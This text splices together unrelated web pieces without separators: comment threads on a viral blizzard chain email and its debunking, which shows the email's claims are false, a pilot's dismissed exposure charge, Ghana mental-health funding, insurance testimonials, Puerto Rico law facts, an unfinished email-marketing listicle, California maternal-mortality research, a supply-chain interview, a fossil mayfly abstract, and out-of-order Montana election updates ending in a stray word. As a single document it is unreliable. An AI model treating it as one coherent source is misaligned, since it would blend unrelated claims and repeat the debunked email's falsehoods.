The entire point of this article is that helplessness is learned. I’m shocked that anyone exalting self-sufficiency is smeared as an anarchist. Being a victim of a hurricane or blizzard doesn’t make one a “victim of government” entitled to be overcompensated at others’ expense.
This is a very positive and uplifting article for adult Americans, and puts to shame the inane bleating of people who are angry at being inconvenienced by the weather and not cradled by the nanny state as if nothing had happened
Glad to have found this site this morning and will enjoy many more essays here.

Good grief. If you don’t know where the photos were taken, then how do you know the record snow didn’t happen?
From Wikipedia, with footnoted news sources:
“The Great Lakes have a great effect on most of the [Upper Peninsula of Michigan]. Winters tend to be long, cold, and snowy for most of the peninsula….Lake Superior has the greatest effect on the area, especially the northern and western parts. Lake-effect snow causes many areas to get in excess of 100–250 inches (250–640 cm) of snow per year—especially in the Keweenaw Peninsula and Gogebic County…. Records of 390 inches (990 cm) of snow or more have been set in many communities in this area…. Because of the howling storms across Lake Superior, which cause dramatic amounts of precipitation, it has been said that the lake-effect snow makes the Keweenaw Peninsula the snowiest place east of the Rockies. Herman, Michigan, averages 236 inches (600 cm) of snow every year.”
I suggest that next time you open your mouth to dismiss and discredit, make sure you actually know your facts.

I grew up in the UP and moved away in 1990. I have family there and if there’d been 44″ anywhere in the UP I would have heard about it. That being said, they don’t whine for the Feds to come and save them when they get a lot of snow. They make do and that is exactly what they would do if they did get 44″ of snow. Last year they got A LOT repeatedly (maybe not Biblical proportions at a time) and were running out of places to park and put the snow.
I remember one winter in the 1970s having very tall snowbanks and having a very narrow path to walk to our front door, between two walls of snow. They did have to use the giant snowblowers a lot on city streets in the Copper Country that year. But as I was pretty young so I can’t remember the exact height.

I am from MI. I now live in MS…32 mi from where Katrina made landfall. It has been 9 1/2 yrs and damage is still around. When it snows at least YOU CAN move it…when wind and water wash away and blow the tinder left behind to hell you need a FEMA trailer house because yours is toothpicks!

North Dakota News Bulletin
This text is from a county emergency manager out in the western part of North Dakota state after the storm.
Amusing, if it were not so true…
WEATHER BULLETIN
Up here in the Northern Plains we just recovered from a Historic event — may I even say a “Weather Event” of “Biblical Proportions” — with a historic blizzard of up to 24″ inches of snow and winds to 50 MPH that broke trees in half, stranded hundreds of motorists in lethal snow banks, closed all roads, isolated scores of communities and cut power to 10’s of thousands.
FYI:
George Bush did not come….
FEMA staged nothing….
No one howled for the government…
No one even uttered an expletive on TV…
Nobody demanded $2,000 debit cards…..
No one asked for a FEMA Trailer House….
No one looted….
Phil Cantori of the Weather Channel did not come….
And Geraldo Rivera did not move in.
Nope, we just melted snow for water, sent out caravans to pluck people out of snow engulfed cars, fired up wood stoves, broke out coal oil lanterns or Aladdin lamps, and put on an extra layer of clothes because up here it is ‘work or die’. We did not wait for some affirmative action government to get us out of a mess created by being immobilized by a welfare program that trades votes for ‘sittin at home’ checks.
Even though a Category “5” blizzard of this scale has never fallen this early…we know it can happen and how to deal with it ourselves.
“In my many travels, I have noticed that once one gets north of about 48 degrees North Latitude, 90% of the worlds social problems evaporate.”
Variations:
E-mailed versions circulated in November 2006 changed the location of the blizzard-stricken community from somewhere in North Dakota to Marquette, Michigan, and attributed the article to The Mining Journal News of that city. While that paper exists, it didn’t publish the piece.
December 2006 versions of this item changed the setting to Colorado, reflecting the back-to-back snowstorms that paralyzed portions of the state during the 2006 holiday season and twice shut down Denver International Airport. (Many of those versions falsely asserted the item came from The Denver Post.) In the wake of those storms, Colorado requested assistance from FEMA to help ranchers recover their livelihoods.
A June 2008 version changed the locale to Cedar Rapids, Iowa, one of the many Midwestern towns and cities hit by severe flooding that month.
A December 2009 variant restored the Michigan version and added several anachronistic photographs of snowdrifts which were actually taken well before Hurricane Katrina hit the Gulf Coast in August 2005.
Origins: On 4 October 2005, portions of Montana, the Dakotas, and Wyoming were hit by an early snowstorm that knocked out power, closed roads, and dumped up to 2 feet of snow. Some schools were closed by the storm, and thousands of power outages were reported. The National Guard was called out in North Dakota to aid the Highway Patrol in rescuing stranded motorists, of which there were hundreds.
In Shoveling snow Dickinson, North Dakota, snowplows led emergency vehicles that were used to deliver fuel to a nursing home and to the Police Department to run generators during a power outage.
Sam Walker, a meteorologist with the National Weather Service in Bismarck, North Dakota, said of the storm: “It is, on our records, probably one of the earliest ones, as far as our recorded history goes, in 126, 130 years.” But that wasn’t the only surprising thing about the storm — only days before, 90 degree temperatures had been recorded in the state (e.g., 92 degrees in Bismarck on 1 October 2005).
The e-mail makes the claim of the snowbound Dakotans that “No one howled for the government.” Yet in a 31 October 2005 letter to President Bush sent through FEMA, Governor John Hoeven of North Dakota did indeed “request that you declare a major disaster for the State of North Dakota as a result of a severe winter storm/snowfall, accompanied by record-breaking snowfall, rain and high winds, that occurred on October 4-6, 2005.” Said request for official disaster status was spurred by an interest in obtaining FEMA assistance: “Additionally, eleven counties meet the criteria established by the Federal Emergency Management Agency
[FEMA] ‘for near record snowfall’ and should be eligible for assistance with FEMA’s snow policy [9523.1].”
Midwesterners hit by this storm appear to have overcome their short-lived catastrophe without federal assistance (although as of 31 October 2005, North Dakota was seeking to recoup its storm-related expenditures from the federal government). However, the bulk of the digging out from under the snowfall and rescuing stranded motorists from snow-entombed cars fell to North Dakota’s police and emergency service workers and the National Guard, not (as the e-mail would have it) to rugged individual citizens who hadn’t been “immobilized by a welfare program that trades votes for ‘sittin at home’ checks.” The comparison made in this piece to New Orleans’ attempt to cope with the massive destruction resulting from Hurricane Katrina is also flawed, as the two weather-related disasters were completely different in nature and severity — one could be coped with locally, but the other could not.

People who don’t expect help from their government in an emergency are fools, as are people who can’t tell the difference between a snowstorm and a hurricane. If you think Michigan is so bad, move to New Orleans. There’s plenty of prime real estate available.

Yep New Orleans has plenty down by the beach…you will need to build your house some 22′ in the air to avoid water damage and put in place construction materials that can withstand 200+ mile an hour winds…and good luck being able to afford $2000+ a month for property ins.

I’ve seen similar pictures taken in Labrador/Newfoundland about 10 years ago. The “records” of which Dr Eowyn speaks are annual snowfall totals and not single events. And folks up there rarely have their homes destroyed by snow tho I do remember about 15 years ago when they had about 12 feet accumulated over several weeks. Regardless, the story is made up and the pictures are stolen from another story. There aren’t many jobs up in the U.P. The place is a treasure but there are boat-loads of people on assistance. So really…can the nonsense.

You who call yourself “Faith” (in Saline, Michigan) are a visitor on my blog, so I would appreciate elementary courtesy on your part. If you’re so sure all this is “nonsense,” then let’s see your proof and your source.

For crying outloud ladies & gentlemen in an uproar (I use terms LOOSELY), the post is NOT abt weather, but CHARACTER, self-reliance, expectations of & responsibilities of citizenship. OMG…it’s our modern educatioinal curse—there’s a bulls’ eye on you, bullets have been loosed, & YOU are arguing about calibre. Who was YOUR reading teacher? Did he/she drill you on “the main idea” or “reading for comprehension?” AND, untie that knot in your panites b/c SOMEWHERE in the USA at any given winter moment …there ARE scenes like this, stories like this. It’s a PARABLE. I KNOW SO…I lived/worked on an isolated inter-mountain West Indian Reservation, at 6,000 ft elevation, for 6 yrs. Every winter (1st blizzard arriving like clockwork on Nov. 1…& lasting ’til end April), we put out 20-30-ft high poles w/black flags atop to line streets so plows could FIND the streets. Snows measured in 400-inch range over the season…much of it layered over layers. We let water run in the bathtub all winter to make sure pipes did not freeze. We slept w/our boots on. AND, hell no—–no one in D.C. cared abt our “problems” & no one sent money to help fix things winters routinely destroyed …& so on…In fact no politician ever found his/her way to my door….THANKS BE TO GOD! We helped ourselves.We watched out for ourselves & neighbors. We knew we were on the edge of Earth by choice or, in my case—by necessity due to a job assignment. We accepted repsonsibilties & got on with it. My “plan B” in life, if we go onward w/this regulation nation, is to move back there b/c no one (ie D.C.) still knows or cares that it’s there.

I have a picture of my Dad when he lived in Sault Ste. Marie, Mi, snow-blowing his yard, and the snow was over his head. I was maybe a teenager then. (in my 50’s now). So the snow did get very deep there at times. He now lives in Pickford, about 25 miles from the Soo, and he says they have LOTS of snow this year too. He has been in upper MI for almost 60 years now!! The one photo above where the are shoveling off a red building was taken in Redford, Mi.!
But as stated, this is about people helping people, a community coming together to help each other. I live in a very small community in MN. where we still do that kind of thing for each other here every day. We ride our lawn mowers to the neighbors to help with their lawn, and we walk or drive to help if someone needs to be shoveled out. If someone needs groceries we go to our cupboards and find a meal or 2 for them. This is what this article is implying.
So yes there has been snow that deep in MI and elsewhere! We have it up to our asses here right now! Just a week ago we got another 6 inches on top of the 30+ we already had. Every time it snows it’s 1-5 inches and it snows at least once every 1-2 weeks. (Otherwise we’re in a deep freeze. It’s below zero every day except maybe one day out of a week) But it doesn’t matter. If you have a neighbor to rely on, you have what you need. So go help someone today, make yourself useful! Right now, I’m waiting on lunch. I’ve been home sick for 3 days now, and the local cafe is going to bring me lunch! Now THAT’S what it’s all about!

Judge dismisses indecent exposure charge against pilot
Written by Maga First News on March 15, 2019
DENVER – A judge has dismissed an indecent exposure charge against a United Airlines pilot.
Carolyn Tyler, a spokeswoman for the Denver district attorney, said Friday that prosecutors decided to drop the case against Andrew Collins because there wasn’t a reasonable likelihood of conviction at trial.
Collins was arrested in September after being accused of standing naked in front of his 10th-floor hotel window overlooking the Denver International Airport terminal. He pleaded not guilty.
His attorney, Craig Silverman, said previously that it’s not a crime to be naked in a hotel room in Denver and that Collins didn’t know that people could see him when he partially opened the curtains.
The Denver Post reports the incident led to a six-month suspension for the 22-year pilot from Leesburg, Virginia.

Dr. Akwesi Osei, CEO of the Mental Health Authority
The Chief Executive Officer (CEO) of the Mental Health Authority, Dr. Akwesi Osei says mental health care in Ghana is under resourced and urgently needs a sustainable funding mechanism.
He has asked the Ministry of Finance to establish the mental health levy required under Act 846 of the Mental Health Act 2012 to enable the authority generate money to attend to the mental health needs of the public.
Dr. Osei told the Goldstreet Business in an interview in Accra on Tuesday that the mental health levy “would ensure that part of the national taxes derived from the telecommunication networks, fuel and the special petroleum fund are dedicated to funding mental health”.
He observed that the lack of political will on the part of government to provide a Legislative Instrument (LI)to support the implementation the mental health Act 2012 has made it difficult to provide effective mental health care services in Ghana.
World Mental Health day
As Ghana joins the rest of the world to observe the World Mental Health Day today, Dr. Osei says the government must consistently release money for mental health care and procure psychotropic medicines for mental health care.
He said without this, Ghana’s development as a nation will always be retarded and Ghanaians will rightly blame governments.
According to Dr. Osei, the government has not released any substantial funding for the provision of care in all three mental health facilities since the beginning of the year.
“The government has only paid salaries of mental health nurses, but has not committed resources to provide services to mental health patients,” he said.
He stated that everyone is prone to mental illness, hence the need for the public to assist and give care to persons with mental illness.

What our customers are saying
Easier than i thought
— AnnMarie Benet
I was pleasantly surprised at how easy it was to get a policy through Guide To Insure. Contrary to other Insurance companies, their representatives did not treat me as a sale or trick me into something i didn't need. I found a policy that was right for me, and signing up was quick and simple. Thanks Guide To Insure!!
Insurance made simple
— Michael Caliborne
As a former Insurance expert having worked in the industry for 30 years, it was refreshing to see that the Guide To Insure experts were wiling to take the time to make sure I had all the information I needed. I was impressed with the manner in which my account was handled, and all personnel I spoke with were understanding, empathic and helpful. I received great service and would absolutely refer this company to a family member or friend. Thank you.

Interesting Facts About Puerto Rico
The Commonwealth of Puerto Rico is a territory of the United States, located in the northeastern Caribbean. The islands were ceded to the United States in 1898, as an outcome of the Treaty of Paris. Although Puerto Rico is not a U.S. state, U.S. federal laws apply to Puerto Rican citizens, who were declared U.S. citizens in 1917.
Puerto Rico has a republican form of government similar to that of the U.S. with its three branches. Its capitol is located in San Juan, and is home to the Legislative Assembly. Puerto Rican law is a hybrid system of common law (similar to U.S. case law) and civil law (statutes created by legislature). Thus, lawyers in Puerto Rico must study and examine these two overlapping systems when assisting clients.
Puerto Rico's court system is composed of the Supreme Court of Puerto Rico, a Court of Appeals, and the Court of First Instance. Selected fundamental rights from the U.S. Constitution apply to Puerto Rican citizens. U.S. Supreme Court cases have commented on which other specific rights apply to the territory. For example, residents of Puerto Rico generally do not have the right to vote in U.S. presidential elections
Lawyers in Puerto Rico assist clients by providing a wide range of legal services. Puerto Rico lawyers are available to assist with legal issues that can be very unique to the area. Attorneys in Puerto Rico are also available for representation in court during lawsuits and other types of legal claims.

6 Email Marketing Tools to Improve Your Marketing Campaign

With so many different ways to reach customers, many marketers often wonder, is email-marketing still worth it? The answer is yes. According to a report by Entrepreneur, an individual receives around one hundred and twenty-one emails on an average each day. With a number that high, it is hard to imagine a marketing campaign that does not focus on sending emails to attract and retain customers.
Another study by Direct marketing Association states that email marketing delivers 4300 percent on investment. This makes it clear that this form of marketing is an appropriate place to spend budget.
Top 7 Reasons You Should Invest In Email Marketing
Reduced time and efforts
Easy to create
Get User and customer database information
Communicate frequently with customers
Reduce overhead costs
Track sales and user engagement
High return on investment
However, as consumer preferences are changing, so is the way of sending out emails. Simply sending impersonal messages with little or no context will only land the emails in the spam box. Hence, it has become important for marketers to use the right marketing tools for sending emails, which can be personalised, reach the target audience and convert them into customers.
How to select a suitable tool for email marketing?
As email marketing is one of the most effective ways to share your message, attract customers, promote your product and services and connect with your target audience, you should make sure you are using a suitable tool. Read the following points that can help you simplify your selection process.
Integration with your contact database
Handling and updating mailing lists manually can take up a considerable of your time. Hence, you need to select a stool for email marketing that can seamlessly integrate with your CRM. This will offer you a hassle-free solution to manage valuable content and customer database.
Options for reading and viewing
As people generally use their mobile to do most of the things, it is very likely that they’ll use the same device for reading emails too. If someone happens to check your email on their phone and it does not open in the right form, they’ll bounce immediately. Hence, consider selecting an email marketing tool that comes with functionality and mobile-optimised templates.
Mailing statistics
A marketing campaign without being able to track results would not be of any use. Hence, you need a platform that offers marketing statistics such as the number of emails opened, sent, link tracking and others.
Response handling
Along with sending out emails, you also need to make sure that all of them are responded on a regular basis. If you aren’t sending emails to a large number of people, handling responses would not be a problem. However, for handling mass amounts of emails, choose a tool that allows you to send auto-generated messages.
These are some of the parameters you should look for while finalising an ideal tool for your email marketing campaign. Now, let’s look at some of the best email marketing tools available on the market for your business. Keep reading to know more.

Maternal death rate lowered in California, but racial disparity remains
(Unsplash)
By Chloe Reichel
After the launch of an initiative to reduce maternal mortality in California, which focused on preventing death caused by hemorrhage and preeclampsia, the maternal death rate fell from an average of 13.1 per 100,000 live births from 2005 to 2009 to 7.0 between 2011 and 2013, according to new research in Health Affairs.
Though maternal mortality rates fell for both black and white mothers, the gap between the two remained. In other words, maternal mortality rates for black mothers were still three to four times higher.
Dr. Elliott K. Main, professor of obstetrics and gynecology at Stanford University and lead author of the paper, explained that effort launched after the California State Department of Public Health noticed in 2006 a two-decade rise in the number of women who died from childbirth or pregnancy-related causes.
“It set off alarm bells and they said ‘OK, we need to dig deeper,’” Main told Journalist’s Resource. “Everybody wants to avoid maternal death; it’s one of the biggest catastrophes I can think of in medicine,” he said.
The state put together a maternal mortality review committee, which Main chaired.
“The philosophy was, this is research, but it also was a prelude to action,” Main said. The committee analyzed the state’s maternal deaths with a focus on initiatives that would reduce the maternal mortality rate.
They brought together key stakeholders, including hospitals, clinicians, professional societies, the California Hospital Association, state agencies, consumer organizations, policymakers and researchers through the California Maternal Quality Care Collaborative.
The group developed quality improvement toolkits and learning collaboratives for the two most preventable causes of maternal deaths according to their records review – hemorrhage and preeclampsia. The toolkits included “examples of evidence-based practices, sample policies, mini-reviews of key topics, implementation recommendations, and an educational slide set,” the authors explain. The learning collaboratives tracked hospitals’ efforts to reduce maternal mortality, providing quality improvement support and collecting real-time data.
Main said that the wide-ranging Collaborative allows the project to create change at scale. This is especially key, Main said, because of the state’s large size and population — 1 of every 8 babies in the United States is born in California.
Over the last decade, the efforts have reached almost every hospital in California.
The initiative also comprised a concerted data collection system, in which 212 of California’s 240 hospitals are enrolled.
As hospitals across the state rolled out the toolkits and participated in learning collaboratives, maternal mortality decreased.
Specifically, the researchers found:
The 99 hospitals that participated in a learning collaborative on reducing severe maternal morbidity “saw a reduction in severe maternal morbidity among women with hemorrhage of more than 20 percent, compared to the 1.2 percent reduction in a contemporary comparison group of 48 hospitals … that were not yet participating in the collaborative.”
Some of these hospitals previously had participated in another learning collaborative on the topic of hemorrhage, and they did even better – they saw a 28.6 percent improvement, compared with 15.4 percent among hospitals that were first-time participants.
Main said that while the study doesn’t prove a causal connection between the Collaborative’s efforts and the statewide reduction in maternal mortality, the researchers were not aware of other activities going on in the state that shared this specific focus. He did note, however, that as a state, California “embraced” the Affordable Care Act. The rate of uninsured people in the state dropped to below 7 percent after it was enacted, and expanding access to care might have played some role.
The Collaborative is now focusing on reducing the state’s cesarean birth rate. In the first year of this effort, the state has seen a reduction of almost 4 percentage points in low-risk first-birth cesarean deliveries – a drop from 28.8 percent to 24.9 percent.
Meanwhile, other states are following suit. The National Network of Perinatal Quality Collaboratives, a project launched by the Centers for Disease Control and Prevention and the March of Dimes, and the Alliance for Innovation on Maternal Health have both initiated multi-state efforts to reduce maternal mortality.

Research chat: Global supply chains expert Richard Locke
(mit.edu)
By Brendan Brady
Richard Locke, a political scientist at Brown and MIT and author of the 2013 book The Promise and Limits of Private Power: Promoting Labor Standards in a Global Economy, analyzes a broad array of issues relating to corporate supply chains. His research highlights how the fragmentation of the supply chain — along with the short-term nature of relationships between retailers and their suppliers — has put downward pressure on workplace standards. Corporate brands’ labor codes of conduct have proven insufficient, he argues, and governments must play a more substantive role in oversight.
Locke’s latest research paper, “Does Lean Improve Labor Standards? Capability Building and Social Performance in the Nike Supply Chain,” for Brown’s Watson Institute for International Studies, has some promising findings in terms of identifying strategies to reduce serious labor violations, but finding solutions remains complex.
For journalists, Locke’s work can be particularly valuable, as it provides empirical data to help inform and deepen coverage on issues that are often difficult to pin down; he works directly with companies such as Nike, Apple and HP to gain access to international facilities and data, and to provide independent analyses of their operations. Supply-chain and global labor issues have become more prominent in the news, but attention is often spotty. The April 2013 deaths of more than 1,100 workers in a factory collapse in Bangladesh, the second-biggest garment exporter in the world, drove home how dangerous and difficult the conditions can be under which many major brands’ products are produced. Controversy around these issues continues to play out there and in other countries such as Cambodia.
Journalist’s Resource researcher Brendan Brady recently caught up with Locke to discuss these dynamics. The following interview has been edited.
_____
Journalist’s Resource: After high-profile factory disasters or reports of exploited workers, the problem tends to be framed in terms of greed by major brands or poor local governance. But in your book The Promise and Limits of Private Power, you talk about how the demands of consumers for high volumes of clothing and ever-changing fashions have put more pressure on factories, which is then displaced onto workers. What responsibility do consumers bear, and what is the role of consumption patterns in fueling onerous working conditions?
Richard Locke: The most important thing is to educate consumers, especially in large markets, so they understand that the choices they make have implications for issues of living standards, working conditions and justice in the factories that produce most of the things we buy every day. I’d like to imagine a way to expand the whole discourse around ethical sourcing, so that it’s not just: If we pay a little bit more, if we buy certain kinds of products — fair trade, organic or whatever — we can then absolve ourselves of any guilt because we’ve made our contribution by paying an extra five cents at Starbucks for a coffee. Rather, I want us to really think about how these products are made and what the pressures are to make them in the quantities, at the price points, and in the timeliness that we demand or that they’re being given to us. Once we consider this, could it be that we rethink some of our consumption patterns? I just think about my own kids — maybe they don’t need twenty shirts in their closet. Maybe they could live with 10 of them, and those 10 would maybe be more expensive, but they would be made under fairer conditions.
JR: How realistic is it for this kind of argument to catch on?
Richard Locke: I think it’s a difficult argument, especially in an economy that’s struggling to recover because people feel that the only way profits can be made is if we sell more stuff, and that if we sell more stuff it means someone is producing more stuff and therefore creating jobs. I think we have to show the viability of an alternative model, where one can be profitable by selling less stuff but with more value-added, and show that the consequences of that are good for the economy and good for the workers. I can imagine that is an easier argument to make to people who have higher incomes than to those who are struggling to get by. But I believe that, if we started directing our attention to this line of research, we would find a lot of waste in this system of just selling a ton of stuff for the sake of it, and maybe, slowly but surely, we could start shifting these consumption patterns.
JR: Consumption patterns aside, do you think consumer attitudes — like labor solidarity, which tends to be stronger in Europe — have a major effect on consumer pressure as well?
Richard Locke: I think what drives people’s consumption patterns are their attitudes. And we know that across the world people have different attitudes. There’s been a lot of research that has shown that consumers in certain kinds of markets, like Australia and Western Europe, are much more attuned to these arguments for fair trade and worker-friendly production than are consumers elsewhere, like in the United States. So some categories of consumers are willing to act with their wallet and willing to pay more for ethically sourced goods. But, still, these numbers are tiny.
JR: You talk in your book about how the diffusion of the global supply chain is one of the biggest complications in terms of achieving accountability. You propose that private oversight could be more effective if retailers and suppliers develop longer-term relationships. How can this be encouraged?
Richard Locke: We live not just in a global economy but in a global supply chain. Many of the commonplace products that we buy are not just made somewhere else but rather the products are fragmented and dispersed in pieces around the world and then are coordinated and assembled in, say, China. So where do you regulate? Do you regulate the final assembly or do you regulate each part of the production process across various countries? That creates even more difficulties in trying to regulate. The traditional forms of national government regulation, or even collective bargaining and countervailing power, is very difficult given the nature of production.
The possibilities for industry self-regulation being more effective exist under two conditions. The first condition is where one sees buyers and suppliers establishing more long-term, mutually beneficial relationships. So you don’t have a constant churn in your supply chain, and you’re just working with whoever offers the lowest bid, but you’re really working with suppliers who have become partners. And once they are engaged in this long-term, mutually beneficial relationship, I think they’re willing to work with one another to find out how can they be more productive, more effective, and make sure they’re balancing market demands with compliance demands.
And we’re able to demonstrate this empirically. And what’s interesting is that company after company I’ve been looking at has been trying to rationalize their supply chains in these ways because they think it’s easer, more effective, etc. The second condition that facilitates industry self-regulation is when it’s complimented by strong government regulation.
JR: In your book, you were quite positive about the impact of Cambodia’s Better Factories program. Would you revise your assessment in light of recent labor unrest there occurring after your book was published?
Richard Locke: Yes, I think I would be a little more balanced in my portrayal of the program, but I think my argument would be the same. And my argument is that even in a place like Cambodia, where you don’t expect anything to work given its history, you see that this program sometimes does work. I know there are a lot of problems — with factory fires and strikes, it hasn’t become a worker’s paradise — but at least the studies I saw show that the program has led to better conditions.
JR: Recent conflict aside, overall, Better Factories has had a pretty good reputation for the workplace conditions it has fostered in Cambodian factories. But the low-wage issue is not under its purview. Is there a good way to design an independent program like this that also addresses wages?
Richard Locke: Because it’s an ILO program, it is subject to the kind of compromises across the main different groups — employers, worker’s groups and government. So there are some issues that are really hard to get an ILO program to push hard on because you can’t get the kind of consensus you need across the different groups. Do I think regulatory programs, whether it’s the ILO program or other programs, should be paying attention to wages? Absolutely. Because we know that in many parts of the world, workers who are working full-time or even more than full-time, in the end, they earn less than what they need for just a very basic life. I think we can get somewhere towards that in the productivity and process improvements I talk about in the book. But I don’t think we’ll get there through that only. We really need to pay a bit more for that good, and that’s where we get back to consumer choices and consumption patterns.
JR: Some labor unions in developing countries have focused on the idea of workers deserving a “living wage” as a bottom-line right. But the argument is challenged by disagreement about what a living wage is. Is the living wage argument an effective way to create a fair standard?
Richard Locke: There are ways to quantify a living wage. The problem is people quantify it in different ways. I think that rather than have what I see as silly debates over the definition of a living wage, and how best to calculate it, what we’re looking for is that people have enough wages to support themselves and their families, not only in terms of their nutrition, housing and healthcare, but in terms of education for their next generation. My experience working in some of these countries is that many people had problems surviving on these wages just in terms of food and housing, let alone healthcare, education, and transportation. And if someone got sick, it all collapsed. So I get frustrated by these debates.
JR: Manufacturers in highly undeveloped and poor manufacturing countries often argue that their factories are providing a better opportunity than local workers otherwise have, and that outsiders are applying an inappropriate standard when they say conditions and pay are not sufficient.
Richard Locke: I never buy that argument. It is better than what they would have in the farm or village, yes, probably. In many of these countries, if you’re born as a young woman in a village, probably the opportunities for you — not just economically, but in terms of basic freedoms — are greater if you work in one of these export-based factories. That’s true, but that’s not a reason for why you would not implement a workplace standard on your books, for why you would not pay fair wages, for why you would have people work beyond a certain number of hours so they get exhausted and injure themselves. That’s not an excuse. So I don’t believe this idea that we’re imposing Western standards on developing countries. I think that’s diversionary.
JR: The media tends to latch on to stories about onerous conditions in factories that supply major brand names, like with Foxconn in China, which was supplying for Apple. And in the wake of the Rana Plaza disaster in Bangladesh, the major brands sourcing from there were called out. Is it productive to focus criticism on name brands?
Richard Locke: I think people are beginning to realize that behind Apple and Hewlett Packard and everyone else are Foxconn and all of these other companies. So it promotes a level of understanding of what’s going on. There are all of these intermediaries, and it’s important for people to see that.
What they should also see is that [these suppliers’] margins are not as high as the brand names. While they may be big and powerful, if you actually look at their profits they’re being squeezed. Why is it that the brands are squeezing them? And then if they’re being squeezed, why is it that the only way they can make money is by squeezing workers in turn? Which is what they’re doing. On the one hand, it’s too simplified [to focus on the role of brand names], and we should look beyond the major brands. But, even if it’s just the tip of the iceberg of the problem and they’re actually usually better than the brands we’ve never heard of, it’s a way of mobilizing attention. Hopefully people are not just thinking about Nike or Apple being a bad company, but about how we’ve structured a world of production that’s creating these difficulties.
JR: Bangladesh is planning to adopt the ILO’s Better Work compliance monitoring program. Is there any particularly important revisions to the model that need to be made for it to work in Bangladesh, to make it more robust and better suited to the conditions of Bangladesh, which would be the largest — and most unwieldy — manufacturing market to implement it?
Richard Locke: Programs like the ILO’s Better Work only work when certain basic conditions are in place: That the government has enough building or labor inspectors; the laws on the books are ones that facilitate independent unions to do their jobs; and so on. It’s my understanding that the discussions over the roll-out of Better Work in Bangladesh are focused on how to promote those underlying conditions in Bangladesh so Better Work can actually stand a chance of being implemented successfully there. The [Bangladesh] government has given reassurances that it will do these things. But it’s a pretty screwed-up system, so we have to make sure that if they don’t, [we assess] how could we publicly withdraw and things like that.

Abstract
Etheridge fil. and Olliff described under the name Ephemera culleni a series of fossil mayfly nymphs from the youngest Tertiary stanniferous lead of the Vegetable Creek Tin-field near Emmaville, New England District of New South Wales. The beds are generally considered to be of Pliocene age. There was no designated holotype and they figured nine specimens in their plate. The specimen considered as an adult with a partly preserved wing and described first in the description of the species is best considered as the holotype of culleni. This specimen, Figure 5 of the plate, bearing the numbers D112 and F1323, is not an adult but only a nymph. Lying close to it is fragmentary plant tissue showing cellular structure which was considered as the wing of the specimen. Figure 9 of the plate shows a quite different type of nymph of which there are further unfigured specimens.
The two species present in the material are very different, even to the extent of being placed in different families, the Leptophlebiidae and the Baetidae.
From the very good state of preservation, with the nymphs mainly lying flat and undistorted, it would seem that they were living on the mud in which they are now preserved. This would indicate very slow flowing water or more probably standing water. If the water was only of a semi-permanent nature the nymphs would die as the mud dried up, the Leptophlebiidae crawling around and dying outstretched, the Baetidae, with their shrimp-like springing, tending to be slightly curved and lying on the side in some cases.

Ballot Initiative Results Not Expected Until Wednesday
Associated Press

By The Associated Press
The Latest on the general election in Montana (all times local):
1:10 p.m.
Montana voters may not know the results of two ballot initiatives until Wednesday.
That's because Yellowstone County's ballot is two pages long, with the Medicaid expansion and mine regulation initiatives on a separate ballot sheet.
County elections director Bret Rutherford tells The Billings Gazette the county will release some preliminary numbers on the initiatives early and tally the candidate races before returning to count the rest of the initiative ballots.
Initiative 185 increases taxes on cigarettes and other tobacco products to help pay for the state's Medicaid expansion program, which provides insurance for 96,000 Montanans.
Initiative 186 would not allow the state to permit new hard rock mines if their cleanup plans require the perpetual treatment of water.
Polling indicates the initiatives are competitive and likely won't be determined without Yellowstone County's results.

Helena resident Alice Elliott says she voted against a ballot initiative to extend the state's Medicaid expansion program by raising the tobacco tax because she believes both sides' ads were misleading.
The self-described Democrat said she voted for another citizen's initiative to add stricter cleanup standards to mines, but couldn't bring herself to vote for the tax measure because she wasn't fully informed.
The tobacco industry spent more than $17 million on a campaign to defeat the measure and health care groups spending millions more in support of it.
Elliott says she thinks both sides engaged in false advertising, and when that happens, she votes no.
She says there will be future opportunities for Medicaid expansion, which is set to expire next year, and the initiative's defeat will not completely close the door on it.
11:15 a.m.
Five precincts in Missoula County are having random troubles with feeding the second page of the ballot into counting machines.
Elections administrator Dayna Causby says the issue shouldn't affect statewide election results because those pages contain mostly city and county bond issues.
Causby says the software company isn't sure why they're having difficulties feeding about one in every 10 ballots. She says those ballots will have to be counted by hand tonight.
The Missoulian reports the problems are at the Lewis and Clark, St. Joseph's, Hellgate and Russell polling locations. Voters are asked to allow a little extra time to vote.

Hatred and intolerance, in particular against the LGBT community, was the primary motivator cited by Billings Democrat Lynne Fitzgerald as she cast her ballot in Montana's closely-contested U.S. Senate and House races.
Fitzgerald, an assistant professor of outdoor leadership at Montana State University Billings, says Republicans like Montana Rep. Greg Gianforte shouldn't be in positions of power.
She wants to elect candidates who are more open-minded and accepting toward lesbian, gay, bisexual and transgender people and others.
On Tuesday, that translated into votes for Gianforte's Democratic challenger, Kathleen Williams, and incumbent Democrat Jon Tester for U.S. Senate.
Tester is being challenged by State Auditor Matt Rosendale, an avowed loyalist to President Donald Trump. Fitzgerald blames Trump for separating the country and trying to take away individuals' rights.

9 a.m.
Montana computer technician Doran Hatcher had a singular goal in mind as he trudged through a cold, snowy morning to cast his ballot in Tuesday's election: Help President Donald Trump.
Hatcher, a 52-year-old Republican from Billings, said Trump needs all the support he can get from Congress to "drain the swamp" in Washington. And that means Democrats like Montana U.S. Sen. Jon Tester have to go, Hatcher says.
He voted for State Auditor Matt Rosendale to replace Tester, who is seeking a third term after winning narrow victories in the Republican-leaning state in 2006 and 2012.
Rosendale's candidacy has been boosted by repeated visits to Montana by Trump.
Polls close at 8 p.m.

7:20 a.m.
Most polling places in Montana are open for the 2018 general election.
The polls are open from 7 a.m. until 8 p.m. Tuesday with the exception of very rural areas, which are allowed to open at noon.
Snow was reported in Bozeman, Butte and Great Falls this morning, but the National Weather Service says its winter weather advisory will expire at 8 a.m.
Temperatures are expected to reach highs mostly in the 20s and 30s across the state.
Through Monday, nearly 324,000 Montanans had cast absentee ballots.
___
11 p.m.
The outcome of Montana's hotly contested Senate race may come down to which side did a better job of motivating their supporters to show up on Election Day.
Tuesday caps an extended 25-day voting period in Montana's midterm elections, with the top race being the battle between Democratic Sen. Jon Tester and Republican challenger Matt Rosendale.
The candidates and political observers say there aren't many undecided voters left in the race after a record amount topping $67 million was spent to influence their choice.
Both Tester and Rosendale have spent the last days of the campaign focused on getting their supporters to the polls.
Voters also will be deciding whether to give Republican U.S. Rep. Greg Gianforte his first full term in office against Democratic challenger Kathleen Williams.

Lahore
